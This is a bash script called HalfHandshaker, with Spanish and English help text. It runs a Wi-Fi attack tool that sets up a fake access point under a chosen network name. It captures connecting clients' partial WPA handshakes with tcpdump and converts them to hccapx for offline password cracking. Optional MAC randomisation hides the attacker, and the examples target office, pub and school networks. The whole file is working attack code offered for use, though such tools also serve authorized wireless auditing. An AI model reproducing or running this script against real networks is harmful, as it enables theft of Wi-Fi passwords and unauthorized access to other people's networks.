#!/bin/bash

####################################################################
#
# HalfHandshaker
#
# By: Miguelillo
# Started:				  26/06/20 - 0.5 Beta 
# Uptdated and rewritted: 26/04/21 - 1.0
#
# For GitHub and for the SeguridadWireless forum community!
#
# Special thanks for fromCharCode!!
#
####################################################################

# Nombre predeterminado del archivo
date=$(date +%d-%m-%y_%H-%M)
output_name="captura_$date"

# Estados
s1="[$(tput setaf 2)+$(tput sgr0)]"
s2="[$(tput setaf 4)+$(tput sgr0)]"
s3="/$(tput setaf 3)!$(tput sgr0)\\"

# Detectar idioma
function lang(){
    if [ "$(echo "$LANG" | head -c 2)" == "es" ]; then
        ### SPANISH ###
        # HELP
        help="""$(tput setaf 2)  _        _ $(tput sgr0) _              _
$(tput setaf 2) | |      | |$(tput sgr0)| |            | |
$(tput setaf 2) | |______| |$(tput sgr0)| |____________| |        Version: 1.0
$(tput setaf 2) |  ______  |$(tput sgr0)|  ____________  | By Miguelillo & fromCharCode
$(tput setaf 2) | | Half | |$(tput sgr0)| | Handshaker | |         27/04/2021
$(tput setaf 2) |_|      |_|$(tput sgr0)|_|            |_|

    -> https://github.com/Miguelillo000/halfhandshaker <-


 Opciones:
 
 $(tput setaf 2)-h, --help$(tput sgr0)            Muestra esta ayuda
 $(tput setaf 2)-v, --version$(tput sgr0)         Muestra la version del script

 
 $(tput setaf 2)-i, --interface            $(tput setaf 3)<interfaz>$(tput sgr0)   Especifica la interfaz a usar

 $(tput setaf 2)-e, --essid    $(tput setaf 3)<nombre>$(tput sgr0)         Especifica el nombre del AP falso
 $(tput setaf 2)-o, --output   $(tput setaf 3)<nombre>$(tput sgr0)         Elige el nombre del archivo .cap y hccapx
 
 $(tput setaf 2)-n, --no-auto-stop$(tput sgr0)     No para automaticamente cuando se detecta un handshake
 $(tput setaf 2)-r, --random-mac$(tput sgr0)       Cambia la mac de la tarjeta de red por una al azar
 

 Ejemplos:

 ./halfhandshaker.sh -i wlan0 -e \"Bar-Juanito\" -o \"red-bar\"
 
 ./halfhandshaker.sh -i wlan0 -e \"Oficinas-12\" -r
 
 ./halfhandshaker.sh -i wlan0 -e \"Red-profesores\" -r -o \"wifi-profes\"
    """
		root_required="Es necesario ejecutar el script con permisos de administrador"; needs="Falta dependencia:"; valid_essid="Se necesita especificar una essid valida"; valid_interface="Se necesita especificar una interfaz valida"; changing_mac="Cambiando mac ->"; changing_mac_o="Restaurando mac ->"; starting="Iniciando"; ctrl_c="para parar"; file_is="Handshake guardado en"; argumment_in="Argumento invalido"; exists1="El archivo"; exists2="ya existe"; overwrite="¿Quieres sobreescribirlo?"; exiting="Saliendo..."; option_in="Opcion invalida"; saving_err="Error al guardar"
    else

        ### ENGLISH ###

        # HELP

        help="""$(tput setaf 2)  _        _ $(tput sgr0) _              _ 
$(tput setaf 2) | |      | |$(tput sgr0)| |            | |
$(tput setaf 2) | |______| |$(tput sgr0)| |____________| |         Beta 0.5
$(tput setaf 2) |  ______  |$(tput sgr0)|  ____________  | By Miguelillo & fromCharCode
$(tput setaf 2) | | Half | |$(tput sgr0)| | Handshaker | |        28/06/2020
$(tput setaf 2) |_|      |_|$(tput sgr0)|_|            |_|
 
    -> https://github.com/Miguelillo000/halfhandshaker <-

 
 Options:
 
 $(tput setaf 2)-h, --help$(tput sgr0)            Show help
 $(tput setaf 2)-v, --version$(tput sgr0)         Show script version
 
 
 $(tput setaf 2)-i, --interface            $(tput setaf 3)<interface>$(tput sgr0)   Set the network interface
 
 $(tput setaf 2)-e, --essid    $(tput setaf 3)<name>$(tput sgr0)         Set the fake AP's name
 $(tput setaf 2)-o, --output   $(tput setaf 3)<name>$(tput sgr0)         Set the name of the cap and hccapx files
 
 $(tput setaf 2)-n, --no-auto-stop$(tput sgr0)     Does not stop automatically when a handshake is captured
 $(tput setaf 2)-r, --random-mac$(tput sgr0)       Change the mac address of the interface by a random one
 
 
 Ejemplos:

 ./halfhandshaker.sh -i wlan0 -e \"John-pub\" -o \"pub-net\"
 
 ./halfhandshaker.sh -i wlan0 -e \"Offices-12\" -r
 
 ./halfhandshaker.sh -i wlan0 -e \"SchoolNet\" -r -o \"teachers-wifi\"
    """
    	root_required="Root priveleges are necessary"; needs="Missing dependency "; valid_essid="A valid essid is required"; valid_interface="A valid interface is required"; changing_mac="Changing mac ->"; changing_mac_o="Restoring mac ->"; starting="Starting"; ctrl_c="to stop"; file_is="Handshake saved in"; argumment_in="Invalid argumment"; exists1="File"; exists2="already exists"; overwrite="Overwrite it?"; exiting="Exitting..."; option_in="Invalid option"; saving_err="Error at saving"
    fi

}
lang

# Ayuda
function show_help(){
	echo "$help"
	exit 0
}

# Al presionar CTRL C
trap printout SIGINT
printout() {
	echo
    exit_script
}

# Comprobacion de permisos de administrador y las dependencias
function check(){
	# Comprueba si tiene permisos de adminsitrador
	if [[ "$(id -u)" != "0" ]]; then
	   echo; echo " $s3 $root_required"; echo
	   exit 0
	fi
	
	# Comprobando las herramientas
	no_tool=0
	dep_list="tcpdump hostapd ifconfig macchanger xterm python3"
	for dependency in $dep_list; do
		if [ -z "$(command -v $dependency)" ]; then 
			echo " $s3 $needs $dependency"
	   		no_tool=1
   		fi
	done
	if [ "$no_tool" == "1" ]; then
		exit_script
	fi
}
check

# Comprobar essid
function check_essid(){
	if [ -z "$essid" ]; then
		echo " $s3 $valid_essid"
		exit 0
	fi
}

# Comprueba interfaz
function check_interface() {
	if [ -z "$interface" ]; then
		error=1
	else
		if [ -z "$(ip link | grep $interface:)" ]; then
			error=1
		fi
	fi
	if [ "$error" == "1" ]; then
		echo " $s3 $valid_interface"
		exit 0  
	fi
}

# Mac random
function random_mac(){
	printf " $s1 $changing_mac "
	ifconfig $interface down > /dev/null && macchanger -r $interface | grep "New" | awk -F "       " '{print $2}' | head -c 18 && ifconfig $interface up > /dev/null ||  echo " /\ ERROR /\\"
	echo
	echo
}

# Devolver mac original
function original_mac(){
	printf " $s1 $changing_mac_o "
	ifconfig $interface down && macchanger -p $interface | grep "New" | awk -F "       " '{print $2}' | head -c 18 && ifconfig $interface up || echo " /\ ERROR /\\"
	echo
}

# Funcion de salida
function exit_script(){
	if [ "$noautostop" = "1" ]; then
		if [ -f "$output_name.cap" ]; then
			if [ "$(python3 half_cap2hccapx.py $essid $output_name.cap c || sleep 0)" == "1" ]; then	
				python3 half_cap2hccapx.py $essid $output_name.cap || echo " $s3 $saving_err"
			fi
		fi
	fi

	killall hostapd > /dev/null  || sleep 0
	rm hostapd.conf || sleep 0

	killall tcpdump > /dev/null || sleep 0

	if [ "$random_mac" == "1" ]; then
		original_mac
	fi

	echo 
	exit
}

# Hostapd
function hostapd(){
    echo " $s1 $starting hostapd..."
    check_essid    
    echo """interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP""">hostapd.conf
    echo
    xterm -T "Hostapd" -e "tput setaf 6 && hostapd hostapd.conf || killall hostapd; hostapd hostapd.conf"
}

# Ataque principal
function attack(){
	check_interface
	check_essid
	if [ "$random_mac" == "1" ]; then
		random_mac
	fi

	echo " $s1 $starting tcpdump..."
	xterm  -T "tcpdump" -e "tput setaf 2 && tcpdump -U -i $interface -w $output_name.cap" &

	sleep 1

	hostapd &
	
	sleep 1

	echo "  ---   CTRL + C $ctrl_c   ---"; echo; printf " "

	if [ "$noautostop" != "1" ]; then
		while [ "$(python3 half_cap2hccapx.py $essid $output_name.cap c || sleep 1)" != "1" ]; do
			tput setaf $((1 + $RANDOM % 6))
			printf "."; sleep 2
		done
		tput sgr0
		python3 half_cap2hccapx.py $essid $output_name.cap && saved=1 || echo "ERROR"
		if [ -f "$output_name.hccapx" ]; then
			echo; echo; echo " $s2 $file_is $(pwd)/$output_name.hccapx"; echo
		fi
	else
		while [ "1" == "1" ]; do
			printf "."; sleep 2
		done
	fi

	exit_script
}

# Escaneo
function scan_probes(){
    check_interface
}

# Comprobando si está vacio
if [ $# == "0" ]; then
    show_help
fi

# Opciones
while [ $# -ne 0 ]; do
	case "$1" in
		-h|--help)
			show_help
			;;
		-v|--version)
			echo "Version: 1.0"
			exit 0
			;;
		-i|--interface)
			interface="$2"
			shift
			;;
		-e|--essid)
			essid="$2"
			shift
			;;
		-o|--output)
			output_name="$2"
			shift
			;;
		-r|--random-mac)
			random_mac=1
			;;
		-n|--no-auto-stop)
			noautostop="1"
			;;
		*)  
			echo
			echo "$argumment_in: $1"
			show_help
			;;
	esac
	shift
done

ok=false
# Comprobar si existe fichero con el mismo nombre
if [ -f "$output_name.cap" ]; then
	while [ "$ok" == "false" ]; do
		echo; echo " $s3 $exists1 $output_name.cap $exists2"; printf " $s2 $overwrite [y/n]: "
		read yn
		if [ "$yn" == "y" ] || [ "$yn" == "Y" ] || [ "$yn" == "yes" ] || [ "$yn" == "YES" ]; then
			echo
			ok=true
		elif [ "$yn" == "n" ] || [ "$yn" == "N" ] || [ "$yn" == "no" ] || [ "$yn" == "NO" ]; then
			echo; echo " $s2 $exiting"; echo
			exit 0
		else 
			echo; echo " $s3 $option_in"; echo
		fi
	done
fi

attack
exit 0